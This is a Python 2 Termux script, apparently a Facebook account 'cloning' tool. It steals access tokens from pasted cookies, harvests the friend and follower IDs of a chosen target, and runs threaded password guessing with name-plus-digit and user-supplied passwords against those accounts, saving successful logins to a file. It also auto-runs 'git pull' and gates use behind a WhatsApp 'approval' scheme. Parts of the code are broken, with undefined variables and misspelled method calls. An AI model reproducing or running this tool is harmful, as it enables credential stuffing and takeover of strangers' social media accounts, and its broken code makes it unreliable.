#!/usr/bin/python2
# coding=utf-8

import os
import sys
import time
import datetime
import re
import threading
import json
import random
import requests
import hashlib
import cookielib
import uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Mr.James'
__copyright = 'All rights reserved . Copyright  Mr.James'
os.system('termux-setup-storage')

try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
os.system('git pull')
os.system('clear')
logo = """
\033[1;92m    .S    .S_SSSs   SSS.        .SSS
\033[1;92m   .SS  .SS~SSSSS   sSSS        SSSs
\033[1;91m   S%S  S%S   SSSS  S%SSS      SSS%S
\033[1;91m   S%S  S%S    S%S  S%S  SS  SS  S%S
\033[1;97m   S&S  S%S•SSSS%S  S%S   s..s   S%S
\033[1;97m   S&S  S&S  SSS%S  S&S    ss    S&S
\033[1;94m   S&S  S&S    S&S  S&S          S&S
\033[1;94m   S&S  S&S    S&S  S&S          S&S
\033[1;93m   d*S  S*S    S&S  S*S          S*S
\033[1;93m  .S*S  S*S    S*S  S*S          S*S
\033[1;96msdSSS   S*S    S*S  S*S          S*S
\033[1;96mYSSY    SSS    S*S  SSS          S*S
\033[1;91m-----------------------------------------------
\033[1;97m➣ Author : Jam Shahrukh x Xtylo Ali Raza
\033[1;97m➣ Github : https://github.com/Stylish-Queen
\033[1;97m➣ Fb Page: Jam Shahrukh Official
\033[1;91m-----------------------------------------------"""


def reg():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mTake The Free Approval For Login'
    print ''
    time.sleep(1)
    
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Blacklisted-CKG/stylish-queen/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \033[1;92mYour Id Is Not Approved Already '
        print ' \033[1;92mCopy the id and send to admin'
        print ' \033[1;92mYour id: ' + to
        raw_input('\033[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923053176060')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \033[1;92mCopy and press enter , then select whatsapp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923053176060')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\033[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\033[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\033[1;92m Your country: ' + country
    time.sleep(1)
    print '\033[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \033[1;92mYour network: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\033[1;93m ~~~~ Login menu ~~~~\033[1;91m'
	print 47 * '-'
        print '\033[1;92m[1] Login with FaceBook'
        print '\033[1;92m[2] Login with token'
        print '\033[1;92m[3] Login with cookies'
        print ''
        log_menu_s()



def log_menu_s():
    s = raw_input(' \033[1;97m╰─jam➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print '\033[1;31;1mLogin with id/pass'
    print 47 * '-'
    lid = raw_input('\033[1;92m Id/mail/no: ')
    pwds = raw_input(' \033[1;93mPassword: ')
    
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\033[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \033[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')



def log_token():
    os.system('clear')
    print logo
    print '\033[1;93mLogin with token\033[1;91m'
    print 47 * '-'
    tok = raw_input(' \033[1;92mPaste token here: \033[1;91m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\033[1;31;1mLogin Cookies'
    print ''
    
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36',
            'referer': 'https://m.facebook.com/',
            'host': 'm.facebook.com',
            'origin': 'https://m.facebook.com',
            'upgrade-insecure-requests': '1',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'content-type': 'text/html; charset=utf-8',
            'cookie': cookie }
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \033[1;92mPress enter to try again ')
        log_menu()



def menu():
    os.system('clear')
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\033[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \033[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print '  \033[1;92mLogged in user: \033[1;91m' + z
    print 47 * '-'
    print ' \033[1;93m Active token: \033[1;91m' + tok
    print ' ------------------------------------------ '
    print '\033[1;92m[1] Crack with Name password' 
    print '\033[1;92m[2] Crack with Number password'
    print '\033[1;92m[3] File Extract'
    print '\033[1;92m[4] View token'
    print '\033[1;92m[5] Logout'
    print '\033[1;92m[6] Delete trash files'
    menu_s()


def menu_s():
    ms = raw_input('\033[1;97m╰─jam➤ ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        idfrom_teman()
    elif ms == '4':
        v_tok()
    elif ms == '5':
        lout()
    elif ms == '6':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()
        
def crack():
    global toket
    
    try:
	toket=open('login.txt','r').read()
    except (KeyError, IOError):
	os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()
    os.system('clear')
    print logo
    print '\033[1;93m~~~~ Name pass cracking ~~~~\033[1;91m'
    print 47 * '-'
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[0] Back'
    a_s()

def auto_crack():
    global token
    
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\033[1;93m~~~~ Name pass cracking ~~~~\033[1;91m'
    print 47 * '-'
    print '\033[1;92m[1] Public id cloning'
    print '\033[1;92m[2] Followers cloning'
    print '\033[1;92m[3] File cloning'
    print '\033[1;92m[B] Back'
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─jam➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\033[1;93m~~~~ Name pass public cracking ~~~~\033[1;91m'
        print 47 * '-'
        print '\033[1;93mFor example:123,1234,12345,786,12,1122\033[1;91m'
        print 47 * '-'
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        pass4 = raw_input(' \033[1;92m[4]Password: ')
	pass5 = raw_input(' \033[1;92m[5]Password: ')
        pass6 = raw_input(' \033[1;92m[6]Password: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
        idt = raw_input(' \033[1;93m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;93m~~~~Name pass public cracking~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '2':
        os.system('clear')
        print logo
        print '\033[1;93m~~~~ Name pass followers cracking ~~~~\033[1;91m'
        print 47 * '-'
        print ' \033[1;93mFor example:123,1234,12345,786,12,1122\033[1;91m'
        print 47 * '-'
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        pass4 = raw_input(' \033[1;92m[4]Password: ')
	pass5 = raw_input(' \033[1;92m[5]Password: ')
        pass6 = raw_input(' \033[1;92m[6]Password: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
        idt = raw_input(' \033[1;93m[★]Enter id: ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\033[1;93m~~~~ Name pass followers cracking ~~~~'
            print ' \033[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\033[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
        
    elif a_s == '3':
        os.system('clear')
        print logo
        print '\033[1;93m~~~~ Name pass File cracking ~~~~\033[1;91m'
        print 47 * '-'
        print '\033[1;93mFor example:123,1234,12345,786,12,1122\033[1;91m'
        print 47 * '-'
        p1 = raw_input(' \033[1;92m[1]Name + digit: ')
        p2 = raw_input(' \033[1;92m[2]Name + digit: ')
        p3 = raw_input(' \033[1;92m[3]Name + digit: ')
        pass4 = raw_input(' \033[1;92m[4]Password: ')
	pass5 = raw_input(' \033[1;92m[5]Password: ')
        pass6 = raw_input(' \033[1;92m[6]Password: ')
        pass7 = raw_input(' \033[1;92m[7]Password: ')
        pass8 = raw_input(' \033[1;92m[8]Password: ')
        try:
	    idlist= raw_input('[+] File Name: ')
	    for line in open(idlist ,'r').readlines():
	        id.append(line.strip())
	except IOError:
	    print"[!] File Not Found."
	    raw_input('Press Enter To Back. ')
	    crack()
    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \033[1;97mCrack Running\033[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;94mJam King Of Facebook\033[1;91m'
    print 47 * '-'
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers = header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass1
                cp = open('HOP_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers = header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
			else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass4 + '\n')
                                ok.close()
                                oks.append(uid + pass4)
                            elif 'www.facebook.com' in q['error']:
                                print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass4
                                cp = open('HOP_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass4 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
			    else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass4 + '\n')
                                    ok.close()
                                    oks.append(uid + pass4)
                                elif 'www.facebook.com' in q['error']:
                                    print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass4
                                    cp = open('HOP_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass4 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass4)
				else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass4 + '\n')
                                        ok.close()
                                        oks.append(uid + pass4)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass4
                                        cp = open('HOP_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass4 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass4)
				    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers = header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\033[1;92m[JAM-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass4 + '\n')
                                            ok.close()
                                            oks.append(uid + pass4)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\033[1;31;1m[JAM-CP] ' + uid + ' | ' + pass4
                                            cp = open('HOP_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass4 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass4)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mCrack Done'
    print ' \033[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \033[1;93mPress enter to back')
    auto_crack()
	
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
	
def dump():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ' Token invalid '
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        log_menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/.hst.txt', 'r').read()
    print '  \033[1;92mLogged in user: \033[1;91m' + z
    print 47 * '-'
    print ' \033[1;93m Active token: \033[1;91m' + tok
    print ' ------------------------------------------ '
    print '\033[1;92m[1] Crack with Name password' 
    print '\033[1;92m[2] Crack with Number password'
    print '\033[1;92m[3] File Extract'
    print '\033[1;92m[4] View token'
    print '\033[1;92m[5] Logout'
    print '\033[1;92m[6] Delete trash files'
    menu_s()



def idfrom_teman():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ' Token Invalid'
        time.sleep(0.01)
        log_menu()
    os.system('clear')
    print logo
    idt = raw_input(' User ID Target : ')

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        print logo
        print 50 * '\x1b[1;91m\xe2\x94\x80'
        idt = raw_input(' User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            op = json.loads(jok.text)
	    z = op['name']
            print ' Name User      : ' + op['name']
        except KeyError:
            print ' ID Publik Tidak Ada !'
            raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + token)
        q = json.loads(r.text)
	z = q['name']
        jalan('\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mPlease Wait Etract ID ...')
        print 50 * '\x1b[1;91m\xe2\x94\x80'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in q['friends']['data']:
	    uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            idfromteman.append(uid + '|' + nm)
            bz.write(uid + '|' + nm)
            print '\r\x1b[0;97m(\x1b[0;97m' + str(len(idfromteman)) + '\x1b[0;97m)\x1b[0;94m >\x1b[0;97m',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[0;97m ' + a['id']

        bz.close()
        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x9c\x93 \x1b[0;97m)\x1b[0;97m Sukses Mengambil ID \x1b[0;97m....'
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID : %s' % len(idfromteman)
        done = raw_input('\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mSimpan Nama File : ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x88\x9a \x1b[0;97m) File tersimpan : out/' + done
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except OSError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) File tidak tersimpan '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Error creating file'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Terhenti '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except KeyError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Teman tidak ada !'
        raw_input('\n\x1b[0;97m(\x1b[0;91mkembali\x1b[0;97m)')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Tidak ada koneksi !'
        keluar()

if __name__ == '__main__':
    reg()
